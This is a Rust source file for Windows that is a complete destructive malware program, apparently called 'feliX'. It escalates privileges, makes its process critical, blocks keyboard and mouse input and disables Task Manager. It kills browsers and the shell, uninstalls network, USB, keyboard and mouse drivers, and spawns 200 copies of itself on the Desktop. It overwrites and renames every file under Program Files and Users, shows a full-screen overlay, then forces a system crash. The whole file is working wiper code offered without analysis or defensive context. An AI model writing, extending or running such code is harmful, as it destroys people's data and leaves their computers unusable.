#![windows_subsystem="windows"]
use std::ptr;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use std::os::windows::process::CommandExt;
use std::path::{PathBuf,Path};
use std::time::Duration;
use rayon::prelude::*;
use walkdir::WalkDir;
use windows_sys::Win32::UI::WindowsAndMessaging::{
    FindWindowW,ShowWindow,SW_HIDE,CreateWindowExW,DefWindowProcW,DispatchMessageW,
    GetMessageW,RegisterClassW,CS_HREDRAW,CS_VREDRAW,WS_EX_TOPMOST,WS_POPUP,WNDCLASSW,
    GetSystemMetrics,SM_CXSCREEN,SM_CYSCREEN,WM_PAINT,WM_CLOSE,WM_DESTROY,WM_CREATE,
    PostQuitMessage,SetWindowLongPtrW,GetWindowLongPtrW,GWLP_USERDATA,
};
use windows_sys::Win32::Graphics::Gdi::{
    BeginPaint,EndPaint,PAINTSTRUCT,StretchDIBits,DIB_RGB_COLORS,SRCCOPY,BITMAPINFOHEADER,BI_RGB,
};
use windows_sys::Win32::System::Registry::{
    RegOpenKeyExW,RegSetValueExW,RegCloseKey,HKEY_CURRENT_USER,KEY_SET_VALUE,REG_DWORD,
};
use windows_sys::Win32::System::LibraryLoader::{GetModuleFileNameW,GetModuleHandleW};
use windows_sys::Win32::Foundation::{MAX_PATH,HWND,LPARAM,LRESULT,WPARAM};
use windows_sys::Win32::UI::Shell::ShellExecuteW;
use windows_sys::Win32::System::Threading::CREATE_NO_WINDOW;
use windows_sys::Win32::UI::Input::KeyboardAndMouse::BlockInput;
const IMGB:&[u8]=include_bytes!("../static/background.bmp");
#[link(name="ntdll")]
extern "system"{
fn RtlAdjustPrivilege(p:u32,e:bool,c:bool,en:*mut bool)->i32;
fn NtRaiseHardError(e:i32,n:u32,m:u32,pr:*mut std::ffi::c_void,o:u32,re:*mut u32)->i32;
fn RtlSetProcessIsCritical(nv:bool,ov:*mut bool,cr:bool)->i32;
}
fn adm()->bool{let mut o=false;unsafe{RtlAdjustPrivilege(20,true,false,&mut o)==0}}
fn run(){
let mut b=[0u16;MAX_PATH as usize];
let l=unsafe{GetModuleFileNameW(0,b.as_mut_ptr(),MAX_PATH)};
if l==0{return;}
let pw:Vec<u16>=b[..l as usize].iter().cloned().chain(std::iter::once(0)).collect();
let ra="runas\0".encode_utf16().collect::<Vec<u16>>();
unsafe{ShellExecuteW(0,ra.as_ptr(),pw.as_ptr(),ptr::null(),ptr::null(),SW_HIDE as i32);}}
fn setc(){unsafe{
let mut o=false;
RtlAdjustPrivilege(20,true,false,&mut o);
RtlSetProcessIsCritical(true,ptr::null_mut(),false);}}
fn setp(){unsafe{
let mut o=false;
RtlAdjustPrivilege(19,true,false,&mut o);
RtlAdjustPrivilege(17,true,false,&mut o);
RtlAdjustPrivilege(18,true,false,&mut o);
RtlAdjustPrivilege(9,true,false,&mut o);}}
fn mxb(){let _=std::process::Command::new("powershell").args(&["-NoProfile","-Command","(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,100)"]).creation_flags(CREATE_NO_WINDOW).spawn();}
fn dltb(){unsafe{
let tw=FindWindowW("Shell_TrayWnd\0".encode_utf16().collect::<Vec<u16>>().as_ptr(),ptr::null());
if tw!=0{ShowWindow(tw,SW_HIDE);}}}
fn dltm(){unsafe{
let sk="Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\0".encode_utf16().collect::<Vec<u16>>();
let mut k=0isize;
if RegOpenKeyExW(HKEY_CURRENT_USER,sk.as_ptr(),0,KEY_SET_VALUE,&mut k)==0{
let d:u32=1;
RegSetValueExW(k,"DisableTaskMgr\0".encode_utf16().collect::<Vec<u16>>().as_ptr(),0,REG_DWORD,&d as *const u32 as *const u8,4);
RegCloseKey(k);}}}
fn kill(){
for a in vec!["chrome.exe","msedge.exe","firefox.exe","explorer.exe","taskmgr.exe","cmd.exe","powershell.exe","code.exe"]{
let _=std::process::Command::new("taskkill").args(&["/F","/IM",a]).creation_flags(CREATE_NO_WINDOW).output();}}
fn del(){
for c in vec!["Get-PrinterDriver | Remove-PrinterDriver","Get-PnpDevice -Class Net | Uninstall-PnpDevice -Confirm:$false","Get-PnpDevice -Class USB | Uninstall-PnpDevice -Confirm:$false","Get-PnpDevice -Class Mouse | Uninstall-PnpDevice -Confirm:$false","Get-PnpDevice -Class Keyboard | Uninstall-PnpDevice -Confirm:$false"]{
let _=std::process::Command::new("powershell").args(&["-NoProfile","-Command",c]).creation_flags(CREATE_NO_WINDOW).spawn();}}
fn clut(){
let mut b=[0u16;MAX_PATH as usize];
let l=unsafe{GetModuleFileNameW(0,b.as_mut_ptr(),MAX_PATH)};
if l==0{return;}
let ce=PathBuf::from(OsString::from_wide(&b[..l as usize]));
if let Ok(up)=std::env::var("USERPROFILE"){
let d=PathBuf::from(up).join("Desktop");
for i in 0..200{
let fnm=format!("feliX ({}).exe",i);
let fp=d.join(&fnm);
let fpw:Vec<u16>=fp.to_str().unwrap_or_default().encode_utf16().chain(std::iter::once(0)).collect();
if std::fs::copy(&ce,&fp).is_ok(){unsafe{ShellExecuteW(0,ptr::null(),fpw.as_ptr(),ptr::null(),ptr::null(),SW_HIDE as i32);}}}}}
fn uwuf(p:&Path){
let mut np=p.to_path_buf();
let mut ne=p.extension().map(|e| e.to_os_string()).unwrap_or_default();
if !ne.is_empty(){ne.push(".uwu");}else{ne.push("uwu");}
np.set_extension(ne);
let _=std::fs::write(p,b"sha128");
let _=std::fs::rename(p,&np);}
fn uwus(){
for t in vec!["C:\\Program Files","C:\\Program Files (x86)","C:\\Users"]{
WalkDir::new(t).into_iter().flatten().filter(|e| e.file_type().is_file()).par_bridge().for_each(|e|{uwuf(e.path());});}}
fn bsod(){unsafe{
let mut r=0;
NtRaiseHardError(0xC0000022u32 as i32,0,0,ptr::null_mut(),6,&mut r);}}
struct Os{w:u32,h:u32,d:Vec<u8>}
unsafe extern "system" fn op(hwnd:HWND,m:u32,wp:WPARAM,lp:LPARAM)->LRESULT{
match m{
WM_CREATE=>{
let i=image::load_from_memory(IMGB).unwrap().to_rgba8();
let(w,h)=(i.width(),i.height());
let mut d=Vec::with_capacity((w*h*4)as usize);
for y in(0..h).rev(){for x in 0..w{let p=i.get_pixel(x,y);d.extend_from_slice(&[p[2],p[1],p[0],p[3]]);}}
let s=Box::new(Os{w,h,d});
SetWindowLongPtrW(hwnd,GWLP_USERDATA,Box::into_raw(s)as isize);0},
WM_PAINT=>{
let sp=GetWindowLongPtrW(hwnd,GWLP_USERDATA)as *const Os;
if sp.is_null(){return DefWindowProcW(hwnd,m,wp,lp);}
let s=&*sp;
let mut ps:PAINTSTRUCT=std::mem::zeroed();
let hd=BeginPaint(hwnd,&mut ps);
if!s.d.is_empty(){
let bm=BITMAPINFOHEADER{biSize:std::mem::size_of::<BITMAPINFOHEADER>()as u32,biWidth:s.w as i32,biHeight:s.h as i32,biPlanes:1,biBitCount:32,biCompression:BI_RGB as u32,biSizeImage:0,biXPelsPerMeter:0,biYPelsPerMeter:0,biClrUsed:0,biClrImportant:0};
let sw=GetSystemMetrics(SM_CXSCREEN);
let sh=GetSystemMetrics(SM_CYSCREEN);
StretchDIBits(hd,0,0,sw,sh,0,0,s.w as i32,s.h as i32,s.d.as_ptr()as *const _,&bm as *const _ as *const _,DIB_RGB_COLORS,SRCCOPY);
}EndPaint(hwnd,&ps);0},
WM_DESTROY=>{
let sp=SetWindowLongPtrW(hwnd,GWLP_USERDATA,0)as *mut Os;
if!sp.is_null(){let _=Box::from_raw(sp);}
PostQuitMessage(0);0},
WM_CLOSE=>{PostQuitMessage(0);0},
_=>DefWindowProcW(hwnd,m,wp,lp),}}
fn loopo(){unsafe{
let hi=GetModuleHandleW(ptr::null());
let cn="PersistentOverlay\0".encode_utf16().collect::<Vec<u16>>();
let wc=WNDCLASSW{style:CS_HREDRAW|CS_VREDRAW,lpfnWndProc:Some(op),cbClsExtra:0,cbWndExtra:0,hInstance:hi,hIcon:0,hCursor:0,hbrBackground:0,lpszMenuName:ptr::null(),lpszClassName:cn.as_ptr()};
RegisterClassW(&wc);
let sw=GetSystemMetrics(SM_CXSCREEN);
let sh=GetSystemMetrics(SM_CYSCREEN);
let h=CreateWindowExW(WS_EX_TOPMOST,cn.as_ptr(),ptr::null(),WS_POPUP,0,0,sw,sh,0,0,hi,ptr::null());
ShowWindow(h,5);
let mut m=std::mem::zeroed();
while GetMessageW(&mut m,0,0,0)!=0{DispatchMessageW(&m);}}}
fn main(){
if!adm(){run();return;}
setc();
setp();
unsafe{BlockInput(1);}
mxb();
dltb();
dltm();
kill();
std::thread::spawn(||{
del();
clut();
uwus();
std::thread::sleep(Duration::from_secs(30));
bsod();});
loopo();}
